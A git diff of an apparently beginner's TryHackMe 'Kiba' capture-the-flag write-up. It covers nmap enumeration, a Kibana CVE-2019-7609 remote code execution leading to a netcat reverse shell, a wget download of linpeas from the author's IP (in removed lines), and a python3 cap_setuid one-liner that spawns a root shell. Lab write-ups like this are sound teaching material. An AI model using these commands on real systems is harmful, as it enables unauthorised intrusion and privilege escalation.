@@ -1,10 +1,18 @@
-* NOT THE FINAL WRITEUP !!! *
-* 
 # ROOM : KIBA
+
+Hello, i'm Frygg, today i show you my little contribution to the word of cybersecurity. Here a little write up for the room Kiba on TryHackMe, hope it can help someone ;).
+
+In this write up, you can see :
+
+1. Somes usefull tools !
+2. Exploiting a RCE using one CVE and obtaining acces to the server
+3. Root the machine !!!
+
+This is my first write up, it may be modified !
 
 ## 1. Enumeration
 
-First of all, i have to gather somes informations about this boxes.
+First of all, i have to gather somes informations about this boxe.
 I run nmap scan to get open port, version etc.
 
 `nmap -sC -sV {ip}`
@@ -101,7 +109,7 @@ WebServer is empty, just the default apache page. Lets look to the port 5601, wh
 Kibana is a data visualization dashboard for Elasticsearch.
 
 ## 2. Research of exploit !
-After a quick analyze, we found Kibana is  in version 6.5.4.
+After a quick analyze, we found Kibana is in version 6.5.4.
 
 After one quick search on google, we found one CVE about Kibana : **CVE-2019-7609**
 This CVE can lead to a RCE (Remote Code Execution).
@@ -127,31 +135,30 @@ And we have just to wait on the listenner (previously runned with netcat)
 
 Nice, we have the reverse shell on the web server !
 
-1st flag obtained !
+`THM{xx_xxxx_xxxxx_xxxxxx_xxxx_xxx}`
 
 ## 3. Privilege escalation !
 
-After quick analyze of config file or something usefull, i found something interesting but i want see what linpeas can see, linpeas is a great tool for linux enumeration for privesc.
+After quick research of config files or something usefull, i found something interesting in kiba's home.
+One folder is named **.hackmeplease**, in this folder, we have one file, python3 binarie
 
-1. Setup a webserver to download linpeas.
-python3 -m http.server 80
-2. Getting linpeas.sh on the server
-wget {MY_IP}/linpeas.sh
-3. Configure the script whith executable flag:
-chmod +x linpeas.sh
-4. run the script and wait !
+We have to search capabilites to see if we can exloit it:
 
-Great, linpeas found one interesting file !
+`getcap -r / 2<dev/null`
+
+We found this capabilite who is exploitable to get the root :
 
 `/home/kiba/.hackmeplease/python3 = cap_setuid+ep`
 
-This binarie have **cap_setuid+ep** attribute, wich means this binarie can change his UID. We can use it to generate a shell with UID 0 and getting the root.
+This binarie have **cap_setuid+ep** attribute, wich means this binarie can change his UID. 
+We can use it to generate a shell with UID 0 and getting a shell with root privileges.
 
-We can see python have the setuid capabilite and we can exploit this.
-Using GTFOBins we have the right payload to get the root :
+On [GTFOBins](https://gtfobins.github.io/) we have the right payload to get the root :
 
 ```/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'```
 
 We have the root !
 
-root flag obtained !
+This boxe is now rooted !
+
+`THM{xxxxxxxxx_xxxxxxxxxx_xxxxx_xxxxxxxxxxxx}`
